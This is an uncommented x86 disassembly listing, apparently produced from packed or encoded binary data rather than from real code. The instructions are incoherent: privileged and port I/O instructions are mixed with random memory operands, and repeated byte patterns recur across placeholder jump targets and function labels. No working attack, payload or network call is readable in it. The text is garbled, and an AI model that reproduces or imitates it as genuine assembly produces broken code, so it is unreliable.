retn 0x7b6a
cmp [ 0x5692b878 ] bh
jmp r-xdata
jpo r-xdata
clc
mov edi 0xa98f9277
test [ ebx + ebp * 8 + 0x766afe74 ] al
jmp r-xdata
cmpsd [ esi ] [ edi ]
adc eax 0x9336362d
shr [ edi + 0x7b ] 0x7b
and ah [ edx ]
xchg edx eax
mov [ 0xffffffffeb848490 ] eax
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg edi eax
pop es
jg r-xdata
xchg edx eax
pop eax
test eax 0xebeb8484
jmp r-xdata
push ebx
jpo r-xdata
pop esp
jb r-xdata
mov esp 0x2d15a73e
xchg ebx eax
xchg edi eax
cli
push ds
lahf
jpo r-xdata
sub_47b4ba
jmp r-xdata
jmp r-xdata
xchg [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
mov ebx 0x282a8484
dec eax
mov al [ 0xffffffff9280402d ]
mov dh 0x86
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
xchg esp eax
xchg ebx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub al 0xbb
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg edx eax
sub_47b513
xchg ebx eax
jmp r-xdata
jmp r-xdata
mov esp 0x2d15a73e
xchg ebx eax
shr [ edi + 0x7b ] 0x7b
and ah [ edx ]
xchg edx eax
mov [ 0xffffffffeb848490 ] eax
jmp r-xdata
jpo r-xdata
xchg edi eax
pop es
jg r-xdata
xchg edx eax
pop eax
test eax 0xebeb8484
jmp r-xdata
push ebx
jpo r-xdata
pop esp
jb r-xdata
cmpsd [ esi ] [ edi ]
adc eax 0x9336362d
xchg edi eax
cli
push ds
lahf
jpo r-xdata
xchg edx eax
xchg edx eax
test al 0xbb
test [ edx + ebp + 0x2da04828 ] al
inc eax
adc [ edx - 0x7b7b794a ] 0xeb
jmp r-xdata
sub al 0xbb
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg edx eax
sub [ edx - 0x7b7b4458 ] dl
sub ch [ eax ]
dec eax
mov al [ 0xffffffff9280402d ]
mov dh 0x86
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
xchg esp eax
xchg ebx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub_47b5a2
jmp r-xdata
test bl ch
jmp r-xdata
push eax
aas
pop edi
jg r-xdata
jmp r-xdata
mov eax 0xebebebeb
clc
mov edi 0xc147926f
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xchg ebx eax
imul edi [ edi + 0x7b ] 0x7b
xchg edx eax
sar [ edx + 0x7b ] cl
jpo r-xdata
xchg edx eax
inc edi
jmp r-xdata
rol [ esp + eax * 4 - 0x14141415 ] 0xeb
sub_47b647
xchg ebx eax
jle r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov edi [ ebx + 0x7b ]
jpo r-xdata
fstp [ eax + 0x7b ]
jpo r-xdata
sub eax 0x6c53922b
jpo r-xdata
mov [ esp + eax * 4 + 0x21141123 ] 0x11
sbb [ edx - 0x7b7b7e78 ] dl
jmp sub_47b606
sub al 0xf2
xchg esi eax
xchg edx eax
dec ebx
jge r-xdata
jmp r-xdata
std
sub eax 0x76928bf0
lahf
jmp sub_47b693
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg ebx eax
inc esp
jg r-xdata
jpo r-xdata
and [ edx - 0x7b7b40db ] dl
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
idiv dh
xchg edi eax
xchg [ esp + eax * 4 - 0x7b63e86e ] al
test bl ch
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg edi eax
clc
jmp r-xdata
test [ edi - 0x474d7b7c ] dl
jmp r-xdata
xchg edx eax
mov al [ 0xffffffffeb848486 ]
jmp r-xdata
aas
pop edi
imul eax [ ebx + ecx * 2 + 0x7b7bff7e ] 0x7b
sub esi esi
[ edi - 0x1d ]
jpo r-xdata
xchg edi eax
outsd
sub ebx [ ebx - 0x14147b7c ]
test ah ch
xchg ebx eax
neg [ edi - 0x7a6d7b7c ]
js r-xdata
lahf
and edx [ ecx ]
pop ebx
sbb eax 0x239d3ef2
xchg edx eax
0x849a
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edi eax
test [ edx + esi * 4 - 0x14141448 ] al
[ ecx - 0x7b688e6e ]
jpo r-xdata
jmp r-xdata
xchg edx eax
jmp 0xffffffffebcc3b3b
jmp r-xdata
jmp sub_47b658
jmp r-xdata
jmp r-xdata
xchg edi eax
jpo r-xdata
jpo r-xdata
fwait
test [ ebx + ebp * 8 - 0x68137b15 ] al
xchg edx eax
retn
std
sub_47b658
lahf
test [ edx + edx * 4 + 0x7b7b7885 ] al
jmp r-xdata
js r-xdata
inc edi
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
std
retn
jmp r-xdata
jmp sub_47b658
test [ edi - 0x474d7b7c ] dl
jmp r-xdata
and [ edx - 0x7b7b40db ] dl
jmp r-xdata
xchg edi eax
jpo r-xdata
sub ebx [ ebx - 0x14147b7c ]
test ah ch
sub_47b693
push cs
fwait
xchg edx eax
loop r-xdata
adc [ eax ] ecx
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x6c53922b
jpo r-xdata
sub eax 0x76928bf0
lahf
jmp sub_47b693
test [ ebx + ebp * 8 - 0x14141415 ] al
idiv dh
xchg edi eax
xchg [ esp + eax * 4 - 0x7b63e86e ] al
test bl ch
jmp r-xdata
sub_47b6aa
mov edi 0x961d926f
test [ ebx + ebp * 8 - 0x137b1415 ] al
fistp [ ebx + 0x7b ]
jpo r-xdata
sbb eax 0x239d3ef2
xchg edx eax
0x849a
mov ebx 0xb8b22025
jmp r-xdata
sbb eax 0xeb848496
jmp r-xdata
sub eax 0x6c53922b
jpo r-xdata
sub eax 0x76928bf0
lahf
jmp sub_47b693
test [ ebx + ebp * 8 - 0x14141415 ] al
idiv dh
xchg edi eax
xchg [ esp + eax * 4 - 0x7b63e86e ] al
test bl ch
jmp r-xdata
sub_47b6fc
sbb eax 0x239f3ef2
adc [ ebx + 0x1d ] ebx
popfd
and edx [ edx - 0x7b7b6536 ]
je r-xdata
jmp esi
out 0x98 al
test [ esp + esi * 2 - 0x556d8634 ] al
ja r-xdata
popfd
test [ ebx + edx + 0x7b7b7a7f ] al
idiv dh
fild [ esi + 0x282b8484 ]
test [ edi + esi ] ch
jpo r-xdata
xchg esi eax
test [ ebx + ebp * 8 - 0x137b1415 ] al
fistp [ ebx + 0x7b ]
jpo r-xdata
push ss
xchg ebx eax
test [ ebx + ebp * 8 - 0x6d740fd3 ] al
jbe r-xdata
sbb eax 0x239d3ef2
xchg edx eax
0x849a
mov ebx 0xb8b22025
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
idiv dh
xchg edi eax
xchg [ esp + eax * 4 - 0x7b63e86e ] al
test bl ch
jmp r-xdata
sbb eax 0xeb848496
jmp r-xdata
jmp r-xdata
sub eax 0x6c53922b
jpo r-xdata
jmp r-xdata
sub eax 0x76928bf0
lahf
jmp sub_47b693
fbld [ es : eax ]
adc [ edi ] ecx
sbb eax 0x20dd26f2
xchg edx eax
and eax 0xeb8484bf
jmp r-xdata
mov eax [ 0xffffffffdf26f21d ]
and [ ecx ] dl
nop edx esi
frstor [ es : eax ]
sub_47b73e
jmp r-xdata
jmp r-xdata
ja r-xdata
popfd
test [ ebx + edx + 0x7b7b7a7f ] al
idiv dh
fild [ esi + 0x282b8484 ]
test [ edi + esi ] ch
jpo r-xdata
xchg esi eax
test [ ebx + ebp * 8 - 0x137b1415 ] al
fistp [ ebx + 0x7b ]
jpo r-xdata
push ss
xchg ebx eax
test [ ebx + ebp * 8 - 0x6d740fd3 ] al
jbe r-xdata
sbb eax 0x239d3ef2
xchg edx eax
0x849a
mov ebx 0xb8b22025
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
idiv dh
xchg edi eax
xchg [ esp + eax * 4 - 0x7b63e86e ] al
test bl ch
jmp r-xdata
sbb eax 0xeb848496
jmp r-xdata
jmp r-xdata
sub eax 0x6c53922b
jpo r-xdata
jmp r-xdata
sub eax 0x76928bf0
lahf
jmp sub_47b693
fbld [ es : eax ]
adc [ edi ] ecx
sbb eax 0x20dd26f2
xchg edx eax
and eax 0xeb8484bf
jmp r-xdata
mov eax [ 0xffffffffdf26f21d ]
and [ ecx ] dl
nop edx esi
frstor [ es : eax ]
sub_47b755
sub [ ecx ] dl
jl r-xdata
fwait
xchg edx eax
jge r-xdata
xchg edx eax
mov edx 0xebeb8484
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
jpo r-xdata
jpo r-xdata
[ edx - 0x7b7b7c0f ] edx
jmp r-xdata
jmp [ edx - 0x3f ]
sub al 0x77
jmp r-xdata
jmp r-xdata
xchg [ edx - 0x7b7b7c0f ] edx
sub bh al
xchg ebx eax
push ds
xchg [ ebx + 0x1f ] edi
fidivr [ ebx - 0xd848485 ]
test [ esi + ebp - 0x7d56810 ] al
jpo r-xdata
mov eax 0xebebebeb
jmp r-xdata
std
mov edi [ ebx + 0x7b ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
ja r-xdata
test [ esi ] ch
jmp r-xdata
popfd
sbb eax 0x229b36f2
xchg edx eax
sub_47b8b6
test [ 0xffffffff928106f2 ] ebx
dec eax
mov ebp 0x74eb8484
[ edx - 0x68 ]
test [ edx + edx * 4 + 0x7b7b7b69 ] al
idiv [ edi ]
dec ebx
arpl [ ebx ] dx
jae r-xdata
test bl ch
jmp r-xdata
jpo r-xdata
jmp [ ebx ]
jmp r-xdata
[ edi ]
xchg edx eax
loop r-xdata
jl r-xdata
and [ edx + 0x7b7b71df ] dl
sub edi [ esi + edi + 0xd1f1a9b ]
sbb bh [ esi + edi + 0x48120b9f ]
test [ ebx + ebp * 8 - 0x4401dadc ] al
xchg edx eax
mov al [ 0xffffffffeb848491 ]
jmp r-xdata
inc eax
jpo r-xdata
int3
jmp r-xdata
test [ eax - 0x50 ] al
push ecx
jl r-xdata
dec ecx
mov ebp 0x847b933e
sub eax 0x69d99233
jpo r-xdata
mov esp 0x120b9f3e
dec eax
test [ edx + edx * 4 + 0x7b7b713c ] al
jmp r-xdata
cmp edi [ esp + eax * 4 - 0x69276c7c ]
je r-xdata
mov esp 0xb0408484
jpo r-xdata
test [ edx + 0x675f3ff2 ] al
inc eax
mov eax 0x7c23ff74
jpo r-xdata
adc [ edx + edx * 4 - 0x7b7b5a1d ] eax
jmp r-xdata
xor [ edi + edi * 8 + 0x33 ] 0xbc
test [ eax + eax * 2 + 0x3bff74b0 ] al
mov esp 0xd8938484
xchg esi eax
xchg edx eax
je r-xdata
and edi [ ebx + edi * 2 + 0x7b ]
sub_47b96e
push cs
0x34138484 0x580
jbe r-xdata
xchg edi eax
xchg edx eax
shl [ edi - 0xfd17b7c ] 0x97
cli
xchg edi eax
pop ds
jno r-xdata
cmp eax 0xc5239257
jpo r-xdata
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
adc esi [ eax + eax * 4 ]
add eax 0x3df22c76
push edi
xchg edx eax
and eax ebp
cmp edx [ edx - 0x7b7b3bb3 ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
sub eax 0x4883f02c
mov al [ 0xffffffffff748040 ]
xor edi [ esp + eax * 4 + 0x74b04084 ]
push edi
dec ebp
aas
lea eax [ esp + eax * 4 + 0x56d813eb ]
cwde
sub al 0xf2
cmp eax 0x9b009353
xchg edx eax
inc ecx
test [ esp + eax * 4 + 0x7ff797fa ] al
jpo r-xdata
idiv dh
xchg ebx eax
xchg [ esp + eax * 4 - 0x42676cd5 ] eax
test [ ebx + edi - 0x7b3bb26e ] al
test bl ch
jmp r-xdata
jmp r-xdata
test [ ebx + edx - 0x768d1ad8 ] al
cmp eax 0x9b009353
sub eax 0x748d922c
jpo r-xdata
les eax [ esp + eax * 4 - 0x14141415 ]
jmp r-xdata
test [ ebx ] dl
sub ch ah
jb r-xdata
and ah [ edx ]
sub al 0xf2
cmp eax 0x9b16935f
test [ ebx + edx - 0x3421b4c2 ] al
sub al 0xf2
cmp eax 0x9b249377
test [ ebx + edx - 0x1a570fce ] al
sub al 0xf2
cmp eax 0x9b2a936b
test [ edx + edx * 4 + 0x7b7b7fe6 ] al
jmp r-xdata
sub_47ba3a
sbb eax 0xff74a9fe
sub ebp [ edx + 0x7b ]
jpo r-xdata
jmp r-xdata
add al 0xaa
test [ esp + eax * 4 + 0x7b7bd3ec ] al
jpo r-xdata
mov al 0x74
cmp eax 0x9b2a936b
test [ edx + edx * 4 + 0x7b7b7fe6 ] al
jmp r-xdata
mov eax 0x871fff74
test [ eax + esi * 8 - 0x72c06d4d ] al
test [ ebx + ebp * 8 - 0x67a927ed ] al
sub al 0xf2
cmp eax 0x9b009353
test [ ebx + edx - 0x768d1ad8 ] al
sub al 0xf2
cmp eax 0x9b16935f
test [ ebx + edx - 0x3421b4c2 ] al
sub al 0xf2
cmp eax 0x9b249377
test [ ebx + edx - 0x1a570fce ] al
sub al 0xf2
jmp r-xdata
les eax [ esp + eax * 4 - 0x14141415 ]
jmp r-xdata
xchg [ esp + eax * 4 - 0x42676cd5 ] eax
test [ ebx + edi - 0x7b3bb26e ] al
test bl ch
jmp r-xdata
idiv dh
xchg ebx eax
sub_47badc
push [ edi + 0x288484c6 ]
xchg edx eax
xor eax 0xeb8484cc
jmp r-xdata
jmp r-xdata
xchg edx eax
add [ edx - 0x14147b7c ] dh
jmp r-xdata
sbb al 0x87
test [ edx + edi * 4 - 0x7a0f8166 ] al
mov edx 0x927994
mov dl 0x84
test bl ch
jmp r-xdata
xchg edx eax
sub_47bb45
sub [ ecx ] dl
jpo r-xdata
jmp r-xdata
in eax dx
sti
jpo r-xdata
cwde
sub al 0xf2
cmp eax 0x9b009353
test [ ebx + edx - 0x768d1ad8 ] al
sub al 0xf2
cmp eax 0x9b16935f
test [ ebx + edx - 0x3421b4c2 ] al
sub al 0xf2
cmp eax 0x9b249377
test [ ebx + edx - 0x1a570fce ] al
sub al 0xf2
cmp eax 0x9b2a936b
test [ edx + edx * 4 + 0x7b7b7fe6 ] al
jmp r-xdata
jmp sub_47bbb5
jpo r-xdata
jmp r-xdata
jmp r-xdata
mov edi esi
lea esi [ edi + edi * 8 + 0x2b ]
movsb [ edi ] [ esi ]
les eax [ esp + eax * 4 - 0x14141415 ]
jmp r-xdata
jpo r-xdata
test [ eax + esi * 8 + 0x63f26b3e ] al
sub [ edx - 0x7b7b3c42 ] dl
jmp r-xdata
dec [ ebp - 0x5bd4008c ]
xchg [ esp + eax * 4 - 0x42676cd5 ] eax
test [ ebx + edi - 0x7b3bb26e ] al
test bl ch
jmp r-xdata
jmp r-xdata
jpo r-xdata
idiv dh
xchg ebx eax

adc edi [ ebx + 0x4b ]
jpo r-xdata
aas
xchg edx eax
mov ebx 0xeb8484ae
jmp r-xdata
sub al 0x28
test ch ch
sti
pop edi
imul eax [ eax - 0x48 ] 0xffffff92
add ah 0x84
test bl ch
jmp r-xdata
sub [ ebp + ebp * 8 + 0x7b7b7bfb ] al
aas
test bl 0x86
test [ ebx + edx * 4 - 0x7b7b3177 ] al
test [ esi ] 0x8f
sub_47bb65
adc [ ebx + 0x1d9f26f2 ] ecx
cmp eax esi
add [ ebx + 0x7b ] esi
jpo r-xdata
sbb eax 0x929d26f2
inc [ ebx ]
xchg [ esp + eax * 4 - 0x1c6cd4d8 ] al
jne r-xdata
jmp r-xdata
jpo r-xdata
arpl bx sp
inc ecx
jpo r-xdata
int3
mov esi ecx
test [ esi + esi * 8 - 0x446d70fa ] al
scasb [ edi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
adc [ edi + 0x13 ] edi
jpo r-xdata
test [ ebx - 0x7b7b3177 ] dl
mov [ 0x26f21d21 ] al
popfd
xchg edx eax
jpo r-xdata
test [ esi ] 0x8f
test bl 0x86
test [ ebx + edx * 4 - 0x7b7b3177 ] al
xchg edx eax
mov ebx 0xeb8484ae
jmp r-xdata
sub al 0x28
test ch ch
sti
jpo r-xdata
jmp r-xdata
jpo r-xdata

adc edi [ ebx + 0x4b ]
aas
pop edi
imul eax [ eax - 0x48 ] 0xffffff92
add ah 0x84
test bl ch
jmp r-xdata
sub [ ebp + ebp * 8 + 0x7b7b7bfb ] al
aas
sub_47bbec
pushad
js r-xdata
test [ ebx - 0x7b7b3177 ] dl
daa
dec ebx
jo r-xdata
test [ esi ] 0x8f
xchg edx eax
mov ebx 0xeb8484ae
jmp r-xdata
test bl 0x86
test [ ebx + edx * 4 - 0x7b7b3177 ] al
push es
jle r-xdata
inc eax
stosb [ edi ]
jmp r-xdata
jpo r-xdata
je r-xdata
add bh al
test [ edx + edx * 4 - 0x7b7b6121 ] al
jpo r-xdata
jmp r-xdata
jmp r-xdata
stosb [ edi ]
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
call 0xffffffff92c337a9
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp sub_47bbba
or dh [ esp + eax * 4 - 0x1414147c ]
jmp r-xdata
jmp r-xdata
cmp dh [ eax + 0x7b ]
jpo r-xdata
fist [ ebx + 0x7b7b7ae8 ]
xchg edx eax
adc [ ebx - 0x7c ] edi
sub_47bc05
je r-xdata
jg r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x7c ] edi
jmp r-xdata
pop es
pop edi
outsd
sub eax 0x7b7e0692
test bl ch
sti
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x6c141415 ] al
jb r-xdata
jpo r-xdata
stosb [ edi ]
daa
dec ebx
jo r-xdata
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b3a49 ] al
jmp r-xdata
scasd [ edi ]
xchg esp eax
test [ esp + eax * 4 + 0x7b11770e ] al
adc [ edx - 0x7b7b4085 ] 0xffffffeb
jmp r-xdata
push es
jle r-xdata
inc eax
stosb [ edi ]
ja r-xdata
xchg edx eax
push edx
xchg edx eax
test [ esi ] cl
jmp r-xdata
jpo r-xdata
je r-xdata
add bh al
test [ edx + edx * 4 - 0x7b7b6121 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
call 0xffffffff92c337a9
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp sub_47bbba
or dh [ esp + eax * 4 - 0x1414147c ]
jmp r-xdata
cmp dh [ eax + 0x7b ]
jpo r-xdata
fist [ ebx + 0x7b7b7ae8 ]
xchg edx eax
sub_47bc1c
dec eax
mov al [ 0x7b740192 ]
jpo r-xdata
jmp r-xdata
mov edi 0x93df3ef6
jg r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp sub_47bbba
or dh [ esp + eax * 4 - 0x1414147c ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
cmp dh [ eax + 0x7b ]
jpo r-xdata
fist [ ebx + 0x7b7b7ae8 ]
xchg edx eax
adc [ ebx - 0x7c ] edi
jmp r-xdata
pop es
pop edi
outsd
sub eax 0x7b7e0692
test bl ch
sti
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x6c141415 ] al
jb r-xdata
jpo r-xdata
stosb [ edi ]
daa
dec ebx
jo r-xdata
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b3a49 ] al
jmp r-xdata
scasd [ edi ]
xchg esp eax
test [ esp + eax * 4 + 0x7b11770e ] al
adc [ edx - 0x7b7b4085 ] 0xffffffeb
jmp r-xdata
push es
jle r-xdata
inc eax
stosb [ edi ]
ja r-xdata
xchg edx eax
push edx
xchg edx eax
test [ esi ] cl
jmp r-xdata
jpo r-xdata
je r-xdata
add bh al
test [ edx + edx * 4 - 0x7b7b6121 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
call 0xffffffff92c337a9
sub_47bc44
jmp r-xdata
jpo r-xdata
sbb eax 0xbb48abf0
sbb eax 0x920b3ef2
xchg edx eax
mov [ ecx - 0x14147b7c ] gs
jmp r-xdata
sbb eax 0xf01d2ef2
stosd [ edi ]
dec eax
mov ebx 0xb3ef21d
xchg edx eax
fist [ ebx + 0x7b7b7ae8 ]
xchg edx eax
cmp dh [ eax + 0x7b ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp sub_47bbba
or dh [ esp + eax * 4 - 0x1414147c ]
jmp r-xdata
sub_47bc4c
xchg edi eax
movsd [ edi ] [ esi ]
test [ eax + edx * 2 + 0x7aa39289 ] al
jpo r-xdata
je r-xdata
jmp sub_47bc44
inc [ ebp + 0x118484b5 ]
jg r-xdata
test [ ebp + 0x7f118484 ] esi
xchg edx eax
test [ esi + ecx - 0x7b84ee89 ] al
mov bh 0x84
test al bh
mov edx 0x8b789279
test [ esp + eax * 4 - 0x794a0c1 ] al
pop es
pop edi
imul ebp [ edi - 0x6e ] 0x52
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b3a49 ] al
jmp r-xdata
jmp r-xdata
adc [ ebx - 0x7c ] edi
ja r-xdata
xchg edx eax
test [ ebx + ebp * 8 - 0x6c141415 ] al
jb r-xdata
xchg edx eax
push edx
jpo r-xdata
add bh al
test [ edx + edx * 4 - 0x7b7b6121 ] al
stosb [ edi ]
daa
dec ebx
jo r-xdata
push es
jle r-xdata
inc eax
stosb [ edi ]
jmp r-xdata
jpo r-xdata
je r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
call 0xffffffff92c337a9
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp sub_47bbba
or dh [ esp + eax * 4 - 0x1414147c ]
jmp r-xdata
cmp dh [ eax + 0x7b ]
jpo r-xdata
fist [ ebx + 0x7b7b7ae8 ]
xchg edx eax
sub_47bc64
adc [ esi + 0x7b ] esi
jpo r-xdata
jmp r-xdata
xchg edx eax
jpo r-xdata
test [ ebx + ebp * 8 - 0x6c141415 ] al
jb r-xdata
scasd [ edi ]
xchg esp eax
test [ esp + eax * 4 + 0x7b11770e ] al
test bl ch
sti
jpo r-xdata
adc [ edx - 0x7b7b4085 ] 0xffffffeb
jmp r-xdata
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b3a49 ] al
jmp r-xdata
test [ esi ] cl
ja r-xdata
xchg edx eax
push edx
xchg edx eax
jpo r-xdata
add bh al
test [ edx + edx * 4 - 0x7b7b6121 ] al
jmp r-xdata
stosb [ edi ]
daa
dec ebx
jo r-xdata
adc [ ebx - 0x7c ] edi
push es
jle r-xdata
inc eax
stosb [ edi ]
jmp r-xdata
jpo r-xdata
je r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
call 0xffffffff92c337a9
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp sub_47bbba
or dh [ esp + eax * 4 - 0x1414147c ]
jmp r-xdata
cmp dh [ eax + 0x7b ]
jpo r-xdata
fist [ ebx + 0x7b7b7ae8 ]
xchg edx eax
sub_47bcc9
sub [ ebp + ebp - 0x70c10dc5 ] al
inc eax
mov esp 0xb585ff74
test [ ecx + edx - 0x48996d81 ] al
test [ eax + edi * 8 + 0x789279ba ] al
mov eax [ esp + eax * 4 + 0x6b5f3f84 ]
clc
pop es
pop edi
imul ebp [ edi - 0x6e ] 0x52
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b3a49 ] al
jmp r-xdata
ja r-xdata
xchg edx eax
test [ ebx + ebp * 8 - 0x6c141415 ] al
jb r-xdata
xchg edx eax
push edx
jpo r-xdata
add bh al
test [ edx + edx * 4 - 0x7b7b6121 ] al
jmp r-xdata
stosb [ edi ]
daa
dec ebx
jo r-xdata
adc [ ebx - 0x7c ] edi
push es
jle r-xdata
inc eax
stosb [ edi ]
jmp r-xdata
jpo r-xdata
je r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
call 0xffffffff92c337a9
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp sub_47bbba
or dh [ esp + eax * 4 - 0x1414147c ]
jmp r-xdata
cmp dh [ eax + 0x7b ]
jpo r-xdata
fist [ ebx + 0x7b7b7ae8 ]
xchg edx eax
sub_47bd55
cmc
cmpsb [ esi ] [ edi ]
test [ ebx + edx - 0x71048364 ] al
xchg edx eax
xchg esp eax
mov cl 0x84
test bl ch
sbb eax 0x239b3ef2
xchg edx eax
cwde
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 + 0x7983f822 ] al
je r-xdata
jns r-xdata
test al 0x98
test [ esp + esi * 2 + 0x21c471cc ] al
or al 0x7b
jpo r-xdata
jmp r-xdata
std
test [ esi ] ch
inc eax
mov ah 0x74
push [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
les esi [ 0x1d7b7b0f ]
inc eax
mov ah 0x74
dec bh
cwde
test [ eax + edi * 8 - 0xb6d8647 ] al
cmpsb [ esi ] [ edi ]
test [ esi + ebp - 0x68076810 ] al
imul edx [ ecx ] 0x1a
and edx [ ecx ]
push 0x2d
xchg edx eax
outsd
idiv [ edi ]
dec ebx
or eax 0x8b3ef21d
and edx [ ecx ]
or ebx [ 0xffffffff92893ef2 ]
and [ ebp - 0x14147b7c ] ecx
push 0xffffff85
test [ ebx + ebp * 8 - 0x38d90de3 ] al
xchg edx eax
sub eax 0x922d5b11
ficom [ ecx - 0x14147b7c ]
jmp r-xdata
jpo r-xdata
test [ esi + 0x24 ] dl
xchg edx eax
jge r-xdata
jmp r-xdata
jmp r-xdata
clc
jpo r-xdata
xchg edx eax
jno r-xdata
je r-xdata
jbe r-xdata
xchg edx eax
jge r-xdata
jmp r-xdata
je r-xdata
test [ eax + ecx * 2 - 0x6d44014e ] al
salc
jno r-xdata
jmp r-xdata
arpl [ edx - 0x7b7b6344 ] dx
xchg edx eax
cmp eax 0x4b3ff66f
test [ ebx + ebp * 8 - 0x9141415 ] al
aas
imul ebp [ ebx - 0x7b57046e ] 0xffffff84
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ esi ] cl
imul eax [ esp + ebp * 8 + 0x7b7b7b8f ] 0x24
and eax 0x7b7acf92
jpo r-xdata
iretd
jmp r-xdata
jpo r-xdata
je r-xdata
xor ecx ebp
test [ edx + eax * 2 - 0x18b90fa ] al
nop
cmpsb [ esi ] [ edi ]
test [ esi + esi * 8 - 0x7b794c02 ] al
test [ ebx ] ch
test [ 0x79b3f81f ] ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
and al 0x25
xchg edx eax
iretd
mov ecx 0x9df09279
test [ ebx + ebp * 8 - 0x14141415 ] al
je r-xdata
xchg edx eax
and edi [ ebp + 0x7b ]
jmp r-xdata
jmp r-xdata
sub edx [ edx - 0x7b7b77a9 ]
jmp r-xdata
idiv dh
mov bl 0x86
test [ ebx + ebp - 0x7e0d27c ] al
mov bl 0x79
jmp r-xdata
jmp r-xdata
mov ebx 0x99f4ff74
test [ eax + ecx * 2 - 0x14474d45 ] al
jmp r-xdata
jmp r-xdata
or al 0x78
jpo r-xdata
je r-xdata
jmp r-xdata
int1
jmp r-xdata
jpo r-xdata
test bl ch
jmp r-xdata
int 0xc0
test [ ebx + ebp * 8 + 0x3ebc2aeb ] al
xchg [ edx + 0x7b ] edi
jpo r-xdata
xchg edx eax
jmp r-xdata
jpo r-xdata
ffreep st0
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub eax 0x84856a92
test bl ch
sbb eax 0x92c726f2
sub bh [ esi + edi + 0x7b7b7a87 ]
jmp r-xdata
jg r-xdata
jmp r-xdata
xchg edx eax
js r-xdata
je r-xdata
clc
mov edi 0xc1939263
test [ ebx + ebp * 8 + 0x23922eeb ] al
jge r-xdata
push ebp
into
test [ esi + edi * 8 + 0x7f4892bb ] al
jpo r-xdata
xchg edx eax
dec eax
jpo r-xdata
mov eax [ esp + eax * 4 + 0xf11ebeb ]
sbb eax 0x21d92ef2
xchg edx eax
sbb [ esi - 0x14147b7c ] edi
sub [ edx - 0x7b7b6863 ] dl
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
pop ebp
ja r-xdata
jno r-xdata
test [ edx + edx * 4 - 0x7b7b4cc3 ] al
jpo r-xdata
pop edi
outsd
test [ ebp - 0x7c ] cl
in al dx
xchg [ ebx + 0x7b ] edi
jpo r-xdata
xchg edx eax
jmp r-xdata
mov esp 0x7b7a873e
jpo r-xdata
insb
xchg ecx eax
test [ ebx + ebp * 8 - 0x7b7ecb6d ] al
test [ edx - 0x7b7b7369 ] dl
pop eax
mov al 0x84
test bl ch
jmp r-xdata
je r-xdata
not [ ebp - 0x3e6d7b7c ]
test [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
dec ebp
xchg edx eax
xchg ecx eax
cmpsb [ esi ] [ edi ]
popfd
xchg edi eax
test [ ebx + ebp * 8 + 0x74b840eb ] al
dec [ eax - 0x49 ]
test [ edx + edx * 4 - 0x7b7b7a91 ] al
jmp r-xdata
push ecx
cmp eax 0x748484b3
mov bl 0x7d
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
push es
ja r-xdata
sub_47be04
jmp r-xdata
cmp eax 0x4b3ff66f
